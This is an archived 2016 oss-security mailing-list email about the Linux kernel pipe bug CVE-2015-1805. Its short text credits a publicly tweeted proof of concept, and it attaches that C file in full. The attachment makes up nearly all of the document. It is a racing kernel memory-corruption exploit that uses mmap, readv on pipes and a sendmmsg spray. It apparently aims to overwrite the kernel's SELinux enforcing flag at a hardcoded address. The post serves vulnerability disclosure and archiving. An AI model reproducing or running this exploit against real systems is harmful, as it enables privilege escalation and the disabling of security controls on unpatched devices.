X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["8069" "Wednesday" "23" "March" "2016" "02:47:59" "+0300" "Solar Designer" "solar@openwall.com" "<20160322234759.GA530@openwall.com>" "392" "Re: [oss-security] CVE-2015-1805 Linux kernel: pipe: iovec overrun leading to memory corruption" "^Date:" nil nil "3" "2016032223:47:59" "[oss-security] CVE-2015-1805 Linux kernel: pipe: iovec overrun leading to memory corruption" (number mark "        solar@openwa Mar 23  392/8069  " thread-indent "\"Re: [oss-security] CVE-2015-1805 Linux kernel: pipe: iovec overrun leading to memory corruption\"\n") "<56F1B372.9070401@eng.utah.edu>" ("<20150606113057.GA23470@openwall.com>" "<20150609112639.GA20540@openwall.com>" "<20160322205839.GA30835@openwall.com>" "<56F1B372.9070401@eng.utah.edu>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 12027 invoked by uid 550); 22 Mar 2016 23:48:03 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 12009 invoked from network); 22 Mar 2016 23:48:02 -0000
Message-ID: <20160322234759.GA530@openwall.com>
References: <20150606113057.GA23470@openwall.com> <20150609112639.GA20540@openwall.com> <20160322205839.GA30835@openwall.com> <56F1B372.9070401@eng.utah.edu>
Mime-Version: 1.0
Content-Type: multipart/mixed; boundary="r5Pyd7+fXNt84Ff3"
Content-Disposition: inline
In-Reply-To: <56F1B372.9070401@eng.utah.edu>
User-Agent: Mutt/1.4.2.3i
Date: Wed, 23 Mar 2016 02:47:59 +0300
From: Solar Designer <solar@openwall.com>
Reply-To: oss-security@lists.openwall.com
Subject: Re: [oss-security] CVE-2015-1805 Linux kernel: pipe: iovec overrun leading to memory corruption
To: oss-security@lists.openwall.com

--r5Pyd7+fXNt84Ff3
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline

On Tue, Mar 22, 2016 at 03:04:50PM -0600, Scotty Bauer wrote:
> Kingroot is the application it was discovered in by the Zimperium folks.

Thanks.  Meanwhile, @idl3r tweeted what is claimed to be and looks like
a relevant but possibly incomplete PoC for this bug:

<idl3r> Sent a proposal about CVE-2015-1805 to CSW but got no response. Didn't know you guys found it too :D @jduck @ZIMPERIUM
<@idl3r> @jduck Here is a rough PoC if you'd like to try, better success rate is also possible https://github.com/idl3r/testcode/blob/master/test2.c

I've attached this file, for archival.

The default target_addr looks like it was being tested on a specific
kernel for AArch64, but there's nothing very arch specific in here.
The SELinux mode check suggests that target_addr is probably meant to
hit that one variable in the kernel, although there are many other
relevant targets.

Alexander

--r5Pyd7+fXNt84Ff3
Content-Type: text/x-c; charset=us-ascii
Content-Disposition: attachment; filename="CVE-2015-1805.c"

#define _GNU_SOURCE
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>

#include <netinet/ip.h>

#include <sys/mman.h>
#include <sys/uio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/stat.h>

#define INADDR_LOOPBACK	(0x7f000001)      /* 127.0.0.1   */

unsigned long kill_switch = 0;

#define MMAP_START      (0x40000000)
#define MMAP_SIZE       (0x1000)
#define MMAP_BASE(i)    (MMAP_START + (i) * MMAP_SIZE)
#define NR_MMAPS        (512)
enum mmap_status_t {
	MMAP_MAPPED = 0,
	MMAP_UNMAPPED
};
struct mmap_info_t {
	size_t base;
	size_t len;
	void *                  vaddr;
	enum mmap_status_t status;
};
struct mmap_info_t mmap_info[NR_MMAPS];
pthread_t mmap_thread;
static struct iovec mmap_iov[NR_MMAPS];

#define NR_PIPES        (1)
#define MAX_RACE_SECS	(5)
struct pipe_pair_t {
	int fd[2];
};
struct pipe_pair_t pipes[NR_PIPES];
pthread_t pipe_read_threads[NR_PIPES];
pthread_t pipe_write_threads[NR_PIPES];

#define NR_SOCKS	(1000)
pthread_t sendmmsg_threads[NR_SOCKS];

static inline void init_mmap()
{
	int i;

	for (i = 0; i < NR_MMAPS; i++) {
		mmap_info[i].base = MMAP_BASE(i);
		mmap_info[i].len = MMAP_SIZE;
		mmap_info[i].vaddr = mmap(
		        (void *)mmap_info[i].base, mmap_info[i].len,
		        PROT_EXEC | PROT_READ | PROT_WRITE,
		        MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS,
		        -1, 0
		        );

		if (mmap_info[i].vaddr == (void *)-1) {
			perror("mmap failed");
			exit(1);
		}

		mmap_iov[i].iov_base = mmap_info[i].vaddr;
		switch(i) {
		case 0:
			mmap_iov[i].iov_len = 0;
			break;
		case 1:
			mmap_iov[i].iov_len = 32;
			break;
		default:
			mmap_iov[i].iov_len = 8;
		}
	}

	return;
}

static inline void init_pipes()
{
	int i;

	for (i = 0; i < NR_PIPES; i++) {
		if (pipe(pipes[i].fd) == -1) {
			perror("pipe failed");
			exit(1);
		}
	}

	return;
}

int server_sockfd;
struct sockaddr_in sk_client;
#define UDP_SERVER_PORT		(5105)
struct iovec msg_iovecs[NR_MMAPS];
size_t target_addr = 0xffffffc001e3c0c4UL;
static inline void init_sock()
{
	int i;
	struct sockaddr_in server;

	server_sockfd = socket(AF_INET, SOCK_DGRAM, 0);
	if (server_sockfd == -1) {
		perror("socket failed");
		exit(2);
	}

	server.sin_family = AF_INET;
	server.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
	server.sin_port = htons(UDP_SERVER_PORT);
	memcpy(&sk_client, &server, sizeof(server));

	if (bind(server_sockfd, (struct sockaddr *)&server, sizeof(server)) == -1) {
		perror("bind failed");
		exit(2);
	}

	/* Also initialize client side iovecs here */
	for (i = 0; i < NR_MMAPS; i++) {
		msg_iovecs[i].iov_base = (void *)MMAP_START;
		msg_iovecs[i].iov_len = 0x1000;
	}
	msg_iovecs[0].iov_len = 0;
	msg_iovecs[256].iov_len = 0;
	msg_iovecs[1].iov_base = (void *)target_addr;
	msg_iovecs[1].iov_len = 4;
	msg_iovecs[257].iov_base = (void *)target_addr;
	msg_iovecs[257].iov_len = 4;
}

void *sendmmsg_thread_func(void *p)
{
	int sockfd;
	struct mmsghdr msg;
	int retval;

	sockfd = socket(AF_INET, SOCK_DGRAM, 0);
	if (sockfd == -1) {
		perror("socket client failed");
		pthread_exit(NULL);
	}

	if (connect(sockfd, (struct sockaddr *)&sk_client, sizeof(sk_client)) == -1) {
		perror("connect failed");
		pthread_exit(NULL);
	}

	msg.msg_hdr.msg_iov = &msg_iovecs[0];
	msg.msg_hdr.msg_iovlen = NR_MMAPS;

	for(;;) {
		if (kill_switch) { break; }

		retval = sendmmsg(sockfd, &msg, 1, 0);
	}

SENDMMSG_THREAD_FUNC_EXIT:
	close(sockfd);

	pthread_exit(NULL);
}

void *mmap_thread_func(void *p)
{
	int i = 2;

	for(;; ) {
		if (kill_switch) { break; }
		if (i >= NR_MMAPS) { i -= NR_MMAPS; }

		munmap(mmap_info[i].vaddr, mmap_info[i].len);
		mmap_info[i].status = MMAP_UNMAPPED;

		mmap_info[i].vaddr = mmap(
		        (void *)mmap_info[i].base, mmap_info[i].len,
		        PROT_EXEC | PROT_READ | PROT_WRITE,
		        MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS,
		        -1, 0
		        );

		if (mmap_info[i].vaddr == (void *)-1) {
			perror("mmap failed");
		}
	}

	pthread_exit(NULL);
}

static const unsigned long pipe_buf[16] = {
	0, 0, 0, 0, 0, 0, 0, 0,
	0, 0, 0, 0, 0, 0, 0, 0,
};
void *pipe_write_func(void *arg)
{
	int pipe_fd = (int)arg;
	ssize_t len;

	for (;;) {
		if (kill_switch) { break; }
		write(pipe_fd, pipe_buf, sizeof(pipe_buf));
	}

	fprintf(stderr, "pipe_write_func quit\n");

	pthread_exit(NULL);
}

static inline int is_selinux_enforcing()
{
	int fd;
	char c;

	fd = open("/sys/fs/selinux/enforce", O_RDONLY);
	if (fd == -1) {
		return 1;
	}

	read(fd, &c, 1);
	if (c == '0') {
		close(fd);
		return 0;
	}

	close(fd);
	return 1;
}

void *pipe_read_func(void *arg)
{
	int pipe_fd = (int)arg;
	ssize_t len;
	time_t t1, t2;
	int c = 0;

	t1 = time(NULL);

	for(;;) {
		if (kill_switch) { break; }
		len = readv(pipe_fd, &mmap_iov[0], NR_MMAPS);
		if (!is_selinux_enforcing()) {
			fprintf(stderr, "selinux disabled\n");
			pthread_exit(NULL);
		}
		usleep(10);

		c++;
		if ((c & 0x1000) == 0x1000) {
			c = 0;
			t2 = time(NULL);
			if ((t2 - t1) >= MAX_RACE_SECS) {
				pthread_exit((void *)-1);
			}
		}
	}

	pthread_exit(NULL);
}

/* Note: adjust rlimit if needed for more allowed open fd */
int main(int argc, char **argv)
{
	int i;
	int rc;
	void *thread_retval;
	int retry;

	if (argc > 1) {
		target_addr = strtoul(argv[1], NULL, 0);
	}
	fprintf(stderr, "target_addr = %p\n", (void *)target_addr);

	init_sock();
	init_mmap();

redo:
	retry = 0;
	init_pipes();

	for (i = 0; i < NR_SOCKS; i++) {
		rc = pthread_create(&sendmmsg_threads[i], NULL,
			sendmmsg_thread_func, NULL);

		if (rc) {
			perror("sendmmsg_threads failed");

			exit(2);
		}
	}

	sleep(3);
	kill_switch = 1;
	for (i = 0; i < NR_SOCKS; i++) {
		pthread_join(sendmmsg_threads[i], &thread_retval);
	}
	kill_switch = 0;
	sleep(1);

	rc = pthread_create(&mmap_thread, NULL, mmap_thread_func, NULL);
	if (rc) {
		perror("mmap_thread failed");
	}

	for (i = 0; i < NR_PIPES; i++) {
		rc = pthread_create(&pipe_write_threads[i], NULL,
		                    pipe_write_func, (void *)pipes[i].fd[1]);
		if (rc) {
			perror("pipe_write_thread failed");
			exit(2);
		}

		rc = pthread_create(&pipe_read_threads[i], NULL,
		                    pipe_read_func, (void *)pipes[i].fd[0]);
		if (rc) {
			perror("pipe_read_thread failed");
			exit(2);
		}
	}

	for (i = 0; i < NR_PIPES; i++) {
		fprintf(stderr, "join read thread %d...\n", i);
		pthread_join(pipe_read_threads[i], &thread_retval);
		if (thread_retval == (void *)-1) {
			retry = 1;
		}
		fprintf(stderr, "done\n");
	}

	kill_switch = 1;
	fprintf(stderr, "kill others\n");
	fprintf(stderr, "join mmap thread...\n");
	pthread_join(mmap_thread, &thread_retval);
	fprintf(stderr, "done\n");

	for (i = 0; i < NR_PIPES; i++) {
		for(;;) {
			if (close(pipes[i].fd[0])) {
				perror("close write pipe failed");
				continue;
			}

			if (close(pipes[i].fd[1])) {
				perror("close read pipe failed");
				continue;
			}
			break;
		}
	}
	fprintf(stderr, "pipe closed\n");

	if (retry) {
		goto redo;
	}

	exit(0);

	return 0;
}

--r5Pyd7+fXNt84Ff3--
